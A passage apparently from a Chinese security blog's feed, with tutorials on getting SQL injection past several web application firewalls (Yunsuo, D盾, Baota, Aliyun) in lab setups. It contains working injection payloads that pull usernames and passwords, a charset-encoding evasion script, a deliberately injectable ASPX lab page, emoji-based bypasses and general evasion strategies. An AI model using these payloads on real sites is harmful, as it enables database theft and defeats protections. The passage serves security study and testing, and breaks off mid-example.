<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/index.aspx?id=-1--%0dunion select 1,username,password from dbo.users</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/23/sLJWBAZdjR7DPEz.png" alt="image-20211023152418680"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>ZP《Bypass云锁mysql注入》</li>
<li>ZP《Bypass云锁mssql注入》</li>
<li><a href="http://www.alexsel.com/index.php/archives/77/">10种方法绕过云锁以及tamper - Cyberpunk (alexsel.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过D盾</title>
    <url>/post/f020bf7f.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
<blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
</ul>
</li>
<li>位置②<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可以利用加号+替换空格：union+select</li>
</ul>
</li>
<li>位置③<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
</ul>
</li>
<li>位置④<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
</ul>
</li>
<li>位置⑤<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
<li>可以利用点号.替换空格：from.users</li>
<li>可以利用中括号[]替换空格：from[users]</li>
</ul>
</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>数据库：SQL Server 2008R2</p>
<p>Web服务器： IIS7.5 CN</p>
<p>WAF：D盾_v2.1.6.1[测试版]</p>
<p>靶场源码如下：index.aspx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="另类字符集编码绕过"><a href="#另类字符集编码绕过" class="headerlink" title="另类字符集编码绕过"></a>另类字符集编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>HTTP协议兼容性：HTTP Charset的多样性</strong></p>
<p>Content-Type头中使用charset定义字符集的应用场景不只有在responses中，request中同样可以使用。</p>
<p>常见的服务器与可见编码如下所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">服务器信息</th>
<th>可用编码</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Nginx, uWSGI-Django-Python3</td>
<td>IBM037, IBM500, cp875, IBM1026, IBM273</td>
<td>对参数名和参数值进行编码，服务器会对参数名和参数值均进行url解码，需要对等号和&amp; and进行编码(不进行url编码)</td>
</tr>
<tr>
<td style="text-align:left">Nginx, uWSGI-Django-Python2</td>
<td>IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
<td>对参数名和参数值进行便慢慢 服务器会对参数名和参数值均进行url解码 等号和&amp;符号不应该以任何方式编码。</td>
</tr>
<tr>
<td style="text-align:left">Apache-TOMCAT8-JVM1.8-JSP</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码)Body不论是否经过url编码均可等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td style="text-align:left">Apache-TOMCAT7-JVM1.6-JSP</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td style="text-align:left">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
</tbody>
</table>
</div>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>我们使用如下脚本来进行编码转换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">params = sys.argv[<span class="number">1</span>]</span><br><span class="line">charset= sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paramEncode</span>(<span class="params">params=<span class="string">&quot;id=1&quot;</span>, charset=<span class="string">&quot;IBM037&quot;</span>, encodeEqualSign=<span class="literal">False</span>, encodeAmpersand=<span class="literal">False</span>, urldecodeInput=<span class="literal">True</span>, urlencodeOutput=<span class="literal">True</span></span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    equalSign = <span class="string">&quot;=&quot;</span></span><br><span class="line">    ampersand = <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> encodeEqualSign:</span><br><span class="line">       equalSign = equalSign.encode(charset)</span><br><span class="line">    <span class="keyword">if</span> encodeAmpersand:</span><br><span class="line">       ampersand = ampersand.encode(charset)</span><br><span class="line">    params_list = params.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> param_pair <span class="keyword">in</span> params_list:</span><br><span class="line">       param, value = param_pair.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">       <span class="keyword">if</span> urldecodeInput:</span><br><span class="line">          param = urllib.unquote(param).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">          value = urllib.unquote(value).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">       param = param.encode(charset)</span><br><span class="line">       value = value.encode(charset)</span><br><span class="line">       <span class="keyword">if</span> urlencodeOutput:</span><br><span class="line">          param = urllib.quote_plus(param)</span><br><span class="line">          value = urllib.quote_plus(value)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">          result += ampersand</span><br><span class="line">       result += param + equalSign + value</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(paramEncode(params,charset))</span><br></pre></td></tr></table></figure>
<p>这里我们使用IBM037编码进行测试。</p>
<p>中文版的BurpSuite需要改变一下BurpSuite的字体类型</p>
<p><img src="https://i.loli.net/2021/10/25/DIogze9mCHcZJVu.png" alt="image-20211025173724964"></p>
<p>然后使用BurpSuite抓包，并发送到Repeater</p>
<p><img src="https://i.loli.net/2021/10/25/y6D89xcoERK3GJd.png" alt="image-20211025173902801"></p>
<p>修改请求方法为POST</p>
<p><img src="https://i.loli.net/2021/10/25/gmncu36bXZ4GsBy.png" alt="image-20211025174140120"></p>
<p>在Content-Type头中添加charset字段，值为ibm037</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded;charset=ibm037</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/25/Lt6Mq5CXmQ34Ved.png" alt="image-20211025174228156"></p>
<p>使用脚本进行编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 encode.py &quot;id=1&quot; IBM037</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 返回 %89%84=%F1</span></span><br></pre></td></tr></table></figure>
<p>将请求内容改为%89%84=%F1，并发送</p>
<p><img src="https://i.loli.net/2021/10/25/2Ir8FvgntLxJelB.png" alt="image-20211025174653394"></p>
<p>可以看到正常返回查询数据</p>
<p>接下来就是进行SQL注入了</p>
<p><img src="https://i.loli.net/2021/10/25/F3gozrx4LhcKkYa.png" alt="image-20211025174846914"></p>
<p>成功绕过D盾WAF</p>
<h2 id="D盾清洗数据缺陷-多个规则特性组合绕过"><a href="#D盾清洗数据缺陷-多个规则特性组合绕过" class="headerlink" title="D盾清洗数据缺陷+多个规则特性组合绕过"></a>D盾清洗数据缺陷+多个规则特性组合绕过</h2><h3 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：利用D盾清洗数据的特性</strong></p>
<p>WAF内置多种解码器，经过多次解码以后可能导致绕过。</p>
<p>当攻击者提交的参数值中存在大量干扰数据时，如大量空格、TAB、换行、%0c、注释等，WAF需要对其进行清洗（为提升性能和降低规则复杂性），筛选出真实的攻击数据进行检测，但是，如果清洗方式不正确，会导致真正的攻击部分被清洗，然后拿去检测的是不含有攻击向量的数据，从而被Bypass。</p>
<p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
<p>替代字符可查看SQLServer特性。</p>
<p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
<p><strong>规则缺陷/特性：HTTP参数污染</strong></p>
<p>同时提交参数id，会接收所有参数，通过逗号分隔。</p>
<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>抓包，并更改请求方法</p>
<p><img src="https://i.loli.net/2021/10/28/XqhiFpjxySWu9ne.png" alt="image-20211028161329759"></p>
<p><strong>测试D盾清洗数据的特性：</strong></p>
<p>D盾为了防御XSS攻击会对提交的特殊字符进行HTML实体编码，例如提交的数据为<code>&lt;script&gt;</code></p>
<p><img src="https://i.loli.net/2021/10/28/PbwldozU5JFeq48.png" alt="image-20211028162308251"></p>
<p>那么假如我们将提交一个已经实体化编码的数据呢？</p>
<p><img src="https://i.loli.net/2021/10/28/ckNFHZIj7toC2v6.png" alt="image-20211028163222933"></p>
<p>这里并没有将<code>&amp;gt;</code>进行解码，而是将<code>&amp;</code>符进行编码</p>
<p><img src="https://i.loli.net/2021/10/28/u5BcRUfAFNCiHDj.png" alt="image-20211028164318800"></p>
<p>我们可以利用这个特性，使用这串字符去绕过某些多个关键字匹配的规则，如：union…select、order…by、/*…*/、’…’ 等</p>
<p><img src="https://i.loli.net/2021/10/28/IQPAsSnBR1Tv3Xk.png" alt="image-20211028171853112"></p>
<p><strong>绕过 and 1=1</strong></p>
<p>注：1.e可以代替空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1.eand/*%26%67%74%3b*/1=1</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/28/x1AfMFlmO6N8UYE.png" alt="image-20211028173512915"></p>
<p><strong>绕过 order by</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order/*%26%67%74%3b*/by 2</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/28/dqJ1A5OMTsV8Cfj.png" alt="image-20211028174034111"></p>
<p><strong>绕过 union select</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1.eunion--%26%67%74%3b%0aselect NULL,NULL,NULL</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/28/LItXix9URDsbMke.png" alt></p>
<p><strong>绕过 from</strong></p>
<p>from的绕过这就是一个技术活了，这里是利用到了HPP以及%00截断来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1.eunion--%26%67%74%3b%0aselect NULL,username,password/*%26%67%74%3b&amp;id=%00%0d*/from users </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/28/52ovwzqNIPcZxCl.png" alt="image-20211028174713969"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>ZP《BypassD盾mssql注入》</li>
<li><a href="https://blog.csdn.net/zhangge3663/article/details/116394692">干货|各种WAF绕过手法学习_zhangge3663的博客-CSDN博客</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903605&amp;idx=1&amp;sn=5a8df50ef8efbd5293fcf3a8712cd1b8&amp;scene=21#wechat_redirect">Bypass D盾_防火墙（新版）SQL注入防御 (qq.com)</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过宝塔</title>
    <url>/post/30ff95f0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
<p>数据库：MySQL 5.6.50</p>
<p>Web脚本：PHP 5.6.40</p>
<p>WAF：宝塔Linux面板 v7.6.0企业版-Apache防火墙</p>
<p><img src="https://i.loli.net/2021/10/27/yupzNAs62GlkwtY.png" alt="image-20211027210853516"></p>
<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
<p>%00截断是上传漏洞中常用的一个非常经典的姿势，在SQL注入中，也可以用来Bypass。在WAF层，接收参数id后，遇到%00截断，只获取到 id=1，无法获取到后面的有害参数输入。</p>
<p><img src="https://i.loli.net/2021/10/27/m9J84eD31iGwgNy.png" alt="image-20211027211938316"></p>
<blockquote>
<p>注：宝塔的规则也写得非常严格，单从规则的角度来看无法完美地实现绕过，且Apache也不像IIS，能利用的协议特性较少，暂时只这发现这一种绕过思路。</p>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/qq_26090065/article/details/81458937">00截断原理分析_小水池-CSDN博客_00截断</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过阿里云盾</title>
    <url>/post/8426627b.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>目前该绕过细节已提交到阿里云了，现版本的WAF应该是不存再绕过方法了，这里仅仅提供思路参考。</p>
</blockquote>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
<p>数据库：MySQL 5.7.26</p>
<p>Web脚本：PHP 7.3.4</p>
<p>WAF：阿里云Web应用防火墙</p>
<p><img src="https://i.loli.net/2021/10/28/O3SnPjCDQuHhkLz.png" alt="image-20211028181750154"></p>
<blockquote>
<p>注：这里配置的是默认的中等规则组。假如WAF的规则过于严格，则会对业务的连续性产生影响，造成误报；假如WAF的规则过于宽松，则会被轻易绕过，产生漏报。做到二者之间的平衡是判断一款WAF是否好坏的一个重要标准。</p>
</blockquote>
<h2 id="Emoji字符绕过"><a href="#Emoji字符绕过" class="headerlink" title="Emoji字符绕过"></a>Emoji字符绕过</h2><p>这是一个有意思的案例，并且是当时影响了安全宝、阿里云盾的姿势，而且现在测试阿里云盾依然有效。</p>
<h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：emoji的宽字节特性且mysql支持emoji的存储</strong></p>
<p>emoji是一串unicode字集组成，一个emoji图标可以占2、4、7个字节。具体可以查看这篇文章：</p>
<p><a href="https://www.jianshu.com/p/32a95a4fc542">https://www.jianshu.com/p/32a95a4fc542</a></p>
<p>Emoji表情搜索：<a href="https://emojipedia.org/">https://emojipedia.org/</a></p>
<p>如图，一个😄字符占4个字节长度</p>
<p><img src="https://i.loli.net/2021/11/04/BkYmCS54AoeyTQW.png" alt="image-20211104223014305"></p>
<p>既然在查询的时候%23会忽略掉后面的，那么Emoji就可以插入到%23与%0A之间。</p>
<p>我们再来测试阿里云盾：</p>
<p><img src="https://s2.loli.net/2021/12/19/uXwAoQzf1dijyDN.png" alt="image-20211219125901987"></p>
<p>成功绕过了，让我们缩小一下emoji的范围，是不是每一个emoji都可以绕过呢？</p>
<p><img src="https://s2.loli.net/2021/12/19/uZSgGrvwJPtBaAp.png" alt="image-20211219130153030"></p>
<p>看来并不是，这里可以对emoji进行FUZZ，查看具体是哪个emoji可以实现绕过</p>
<p><img src="https://s2.loli.net/2021/12/19/861QTHLruIvt25h.png" alt="image-20211219131348894"></p>
<p>这里仅仅对941个emoji进行FUZZ，可以测试出能够绕过的emoji有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">😠、🧠、🍠、🥠、🚠、🎠、🌠、🛠、☠、⚠️、💠、🔠、🕠、🏴󠁧󠁢󠁥󠁮󠁧󠁿、🏴󠁧󠁢󠁳󠁣󠁴󠁿、🏴󠁧󠁢󠁷󠁬󠁳󠁿</span><br></pre></td></tr></table></figure>
<p>绕过成功！</p>
<p><img src="https://s2.loli.net/2021/12/19/BWFmsRbVqrzaGnp.png" alt="image-20211219130229116"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://documentation.help/InfoSec-cn/55b41898-7649-40b7-8ee7-ab517fad48ac.htm">Bypass阿里云盾、百度云加速、安全宝、安全狗、云锁、360主机卫士SQL注入防御 - Documentation</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过思路总结</title>
    <url>/post/7c4159f7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="架构层面绕过WAF（针对云WAF）"><a href="#架构层面绕过WAF（针对云WAF）" class="headerlink" title="架构层面绕过WAF（针对云WAF）"></a><strong>架构层面绕过</strong>WAF（针对云WAF）</h2><h3 id="寻找真实IP（源站）绕过"><a href="#寻找真实IP（源站）绕过" class="headerlink" title="寻找真实IP（源站）绕过"></a>寻找真实IP（源站）绕过</h3><p>如果流量都没有经过WAF，WAF当然无法拦截攻击请求。当前多数云WAF架构，例如百度云加速、阿里云盾等，通过<strong>更改DNS解析，把流量引入WAF集群</strong>，流量经过检测后转发请求到源站。如图，dict.com接入接入WAF后，dict.com的DNS解析结果指向WAF集群，用户的请求将发送给WAF集群，WAF集群经过检测认为非攻击请求再转发给源站。</p>
<p><img src="https://i.loli.net/2021/11/01/yfediv9cs1FX2Ch.png" alt="image-20211101163158685"></p>
<p>绕过云WAF寻找真实IP与绕过CDN寻找真实IP的方法类似，可以查看这篇文章：</p>
<p><a href="https://plumeria.ltd/post/efd52af7.html#CDN%E7%9A%84%E7%BB%95%E8%BF%87">https://plumeria.ltd/post/efd52af7.html#CDN%E7%9A%84%E7%BB%95%E8%BF%87</a></p>
<h3 id="利用同网段绕过"><a href="#利用同网段绕过" class="headerlink" title="利用同网段绕过"></a>利用同网段绕过</h3><p>一些在云服务商的站点，同时使用云服务商提供的WAF服务。当流量不是通过DNS解析引流到WAF，流量必须经过WAF的检测，这是不能通过发行源站进行绕过。可以考虑在云服务商买一台VPS，通过VPS攻击目标站点，因为流量是局域网，可能不经过WAF检测，实现绕过。能不能成功，关键在于云服务商的网络配置。</p>
<p><img src="https://i.loli.net/2021/11/01/JpW57fB4OIinloh.png" alt="image-20211101164518419" style="zoom: 67%;"></p>
<h3 id="利用边界漏洞绕过"><a href="#利用边界漏洞绕过" class="headerlink" title="利用边界漏洞绕过"></a>利用边界漏洞绕过</h3><p>如果未能发现源站IP，可以尝试寻找子站的SSRF漏洞。如果子站访问目标站不经过WAF集群，可以利用SSRF漏洞来绕过WAF。</p>
<h2 id="资源限制角度绕过WAF"><a href="#资源限制角度绕过WAF" class="headerlink" title="资源限制角度绕过WAF"></a>资源限制角度绕过WAF</h2><h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><p>这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。因此许多WAF只检测前面的几K字节、1M、或2M。对于攻击者而然，只需要在POST BODY前面添加许多无用数据，把攻击payload放在最后即可绕过WAF检测。</p>
<h2 id="协议层面绕过WAF"><a href="#协议层面绕过WAF" class="headerlink" title="协议层面绕过WAF"></a>协议层面绕过WAF</h2><p>即使流量都确保经过WAF，如果WAF的防御策略根本就没有检测payload，那么也就能绕过WAF。协议层面绕过WAF，利用WAF解析协议的问题，使得payload被认为不是请求的HTTP请求的内容。</p>
<h3 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h3><p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
<ul>
<li>application/x-www-form-urlencoded  -编码模式</li>
<li>multipart/form-data  -文件上传模式</li>
<li>text/plain  -文本模式</li>
<li>application/json  -json模式</li>
</ul>
<p>文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
<h3 id="pipeline绕过"><a href="#pipeline绕过" class="headerlink" title="pipeline绕过"></a>pipeline绕过</h3><p>http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。</p>
<p><img src="https://i.loli.net/2021/11/01/EGHhYl5rgwaMvtB.jpg" alt="img"></p>
<p>发送两个请求，但绕过失败，被云锁拦截，此种方法现在基本失效。</p>
<p><img src="https://image.3001.net/images/20201228/1609138356_5fe980b4189b5b725a954.png!small" alt="img"></p>
<h3 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h3><p>分块传输编码（Chunked transfer encoding）是只在HTTP协议1.1版本（HTTP/1.1）中提供的一种数据传送机制。以往HTTP的应答中数据是整个一起发送的，并在应答头里Content-Length字段标识了数据的长度，以便客户端知道应答消息的结束。</p>
<p><strong>分块编码具体方法</strong></p>
<p>在头部加入Transfer-Encoding:chunked之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</p>
<p>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的CRLF(\r\n)，也不包括分块数据结尾的CRLF。</p>
<p>最后一个分块长度值必须为0，对应的分块数据没有内容，表示实体结束。</p>
<p>例：</p>
